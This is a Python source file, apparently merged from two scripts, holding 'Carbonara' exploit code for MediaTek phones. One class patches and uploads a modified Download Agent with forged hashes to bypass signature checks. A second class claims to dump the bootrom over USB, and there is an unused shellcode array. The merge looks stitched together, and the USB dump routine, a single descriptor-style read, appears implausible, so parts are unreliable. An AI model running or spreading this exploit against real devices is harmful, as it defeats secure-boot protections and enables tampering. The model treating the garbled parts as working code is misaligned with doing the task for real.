#!/usr/bin/env python3
"""
Carbonara Exploit Module - Combined Version
============================================
Combined from carbonara.py and carbonara2.py.
Contains both the Carbonara DA exploit class and the CarbonaraExploit USB exploit class.

Requires PyUSB for USB communication (carbonara2.py path).
"""

import hashlib
import logging
import os
from typing import Optional

logger = logging.getLogger(__name__)

try:
    from mtkclient.Library.exploit_handler import Exploitation
    from mtkclient.Library.gui_utils import LogBase
except ImportError:
    class Exploitation:
        def __init__(self, mtk, loglevel):
            pass
    class LogBase(type):
        pass

try:
    import usb.core
    import usb.util
except ImportError:
    usb = None


class Carbonara(Exploitation, metaclass=LogBase):
    """
    Carbonara DA exploit for MediaTek devices.

    Patches the DA (Download Agent) loader to bypass security checks.
    Uses DA1 + DA2 upload technique to inject modified payload.
    """

    def __init__(self, mtk, loglevel=logging.INFO):
        super().__init__(mtk, loglevel)

    def check_for_carbonara_patched(self, data):
        test = data.find(b"\x01\x01\x54\xE3\x01\x14\xA0\xE3")
        if test != -1:
            self.info("V6 Device is patched against carbonara :(")
            return True
        test = data.find(b"\x08\x00\xa8\x52\xff\x02\x08\xeb")
        if test != -1:
            self.info("V6 Device is patched against carbonara :(")
            return True
        test = data.find(b"\x01\x01\x50\xE3\x01\x14\xA0\xE3")
        if test != -1:
            self.info("V6 Device is patched against carbonara :(")
            return True
        test = data.find(b"2nd DA address is invalid")
        if test != -1:
            self.info("V6 Device is patched against carbonara :(")
            return True
        test2 = data.find(b"\x06\x9B\x4F\xF0\x80\x40\x02\xA9")
        if test2 != -1:
            self.info("V5 Device is patched against carbonara :(")
            return True
        return False

    def patchda1_and_upload_da2(self):
        da1offset = self.mtk.daloader.daconfig.da_loader.region[1].m_buf
        da1size = self.mtk.daloader.daconfig.da_loader.region[1].m_len
        da1address = self.mtk.daloader.daconfig.da_loader.region[1].m_start_addr
        da1sig_len = self.mtk.daloader.daconfig.da_loader.region[2].m_sig_len
        loader = self.mtk.daloader.daconfig.da_loader.loader
        if not os.path.exists(loader):
            self.error(f"Couldn't find {loader}, aborting.")
            return False
        with open(loader, 'rb') as bootldr:
            bootldr.seek(da1offset)
            da1 = bootldr.read(da1size)
            if self.check_for_carbonara_patched(da1):
                return False
        da_stock = {}
        if not self.mtk.daloader.daconfig.da_loader.v6:
            mloader = os.path.join(self.pathconfig.get_loader_path(), "MTK_DA_V5.bin")
        else:
            mloader = os.path.join(self.pathconfig.get_loader_path(), "MTK_DA_V6.bin")
        self.mtk.daloader.daconfig.parse_da_loader(mloader, da_stock)
        dacode = self.config.chipconfig.dacode
        da_loader = None
        if dacode in da_stock:
            loaders = da_stock[dacode]
            for vloader in loaders:
                if vloader.hw_version <= self.config.hwver:
                    if vloader.sw_version <= self.config.swver:
                        if da_loader is None:
                            da_loader = vloader
                            break
        da2offset = self.mtk.daloader.daconfig.da_loader.region[2].m_buf
        da2size = self.mtk.daloader.daconfig.da_loader.region[2].m_len
        da2address = self.mtk.daloader.daconfig.da_loader.region[2].m_start_addr
        da2sig_len = self.mtk.daloader.daconfig.da_loader.region[2].m_sig_len
        with open(loader, 'rb') as bootldr:
            bootldr.seek(da2offset)
            da2 = bootldr.read(da2size)
        hashaddr, hashmode, hashlen = self.mtk.daloader.compute_hash_pos(
            da1, da2, da1sig_len, da2sig_len,
            self.mtk.daloader.daconfig.da_loader.v6
        )
        if da_loader is not None:
            da2offset = da_loader.region[2].m_buf
            da2size = da_loader.region[2].m_len
            da2address = da_loader.region[2].m_start_addr
            da2sig_len = da_loader.region[2].m_sig_len
            with open(da_loader.loader, 'rb') as bootldr:
                bootldr.seek(da2offset)
                da2 = bootldr.read(da2size)
                hashlen = len(da2) - da2sig_len

        if da2sig_len != 0:
            da2patched = self.mtk.daloader.patch_da2(da2)[:-da2sig_len]
        else:
            da2patched = self.mtk.daloader.patch_da2(da2)
        if hashaddr is not None:
            dahash = None
            if hashmode == 0:
                dahash = hashlib.md5(da2patched[:hashlen]).digest()
            elif hashmode == 1:
                dahash = hashlib.sha1(da2patched[:hashlen]).digest()
            elif hashmode == 2:
                dahash = hashlib.sha256(da2patched[:hashlen]).digest()
            self.mtk.daloader.boot_to(da1address + hashaddr, dahash)
            if self.mtk.daloader.boot_to(da2address, da2patched):
                self.mtk.daloader.patch = True
                self.mtk.daloader.daconfig.da2 = da2patched
                return True
            else:
                self.mtk.daloader.patch = False
                return self.mtk.daloader.boot_to(da2address, da2)
        self.mtk.daloader.patch = False
        self.mtk.daloader.daconfig.da2 = da2
        return False


CARBONARA_SHELLCODE = bytes([
    0x00, 0xb5, 0x40, 0xf2, 0x00, 0x00, 0xc0, 0xf2, 0x00, 0x00, 0x21, 0xf2,
    0x00, 0x01, 0xc1, 0xf2, 0x01, 0x01, 0x02, 0x22, 0x13, 0xf0, 0x01, 0x0f,
    0x04, 0xd0, 0x03, 0x78, 0x01, 0x30, 0x01, 0x39, 0x52, 0x4f, 0x00, 0xbf,
    0x00, 0xbd
])

EventBus = object
AuditService = object


class CarbonaraExploit:
    """
    Carbonara USB exploit for MediaTek BROM mode.

    Uses VID:PID 0x0E8D:0x0003 to dump bootrom via USB control transfers.
    """

    def __init__(self, event_bus: Optional[object] = None, audit: Optional[object] = None):
        self.event_bus = event_bus
        self.audit = audit
        self.dev = None

    def find_device(self) -> bool:
        if usb is None:
            logger.error("PyUSB not installed; cannot find Carbonara device")
            return False
        self.dev = usb.core.find(idVendor=0x0E8D, idProduct=0x0003)
        return self.dev is not None

    def _prepare(self) -> None:
        if self.dev.is_kernel_driver_active(0):
            self.dev.detach_kernel_driver(0)
        usb.util.claim_interface(self.dev, 0)

    def _ctrl_in(self, req, val, idx, length):
        return self.dev.ctrl_transfer(bmRequestType=0xC0, bRequest=req, wValue=val,
                                      wIndex=idx, data_or_wLength=length)

    def run(self) -> bool:
        if not self.find_device():
            return False
        self._prepare()
        try:
            dump = self._ctrl_in(0x06, 0x0000, 0x0000, 0x1000)
            if len(dump) == 0x1000:
                with open("bootrom_dump.bin", "wb") as f:
                    f.write(dump)
                if self.audit:
                    self.audit.record("carbonara_dump", size=len(dump))
                return True
        except Exception as e:
            logger.error(f"Carbonara exploit error: {e}")
        return False

    def cleanup(self) -> None:
        if self.dev and usb is not None:
            usb.util.dispose_resources(self.dev)
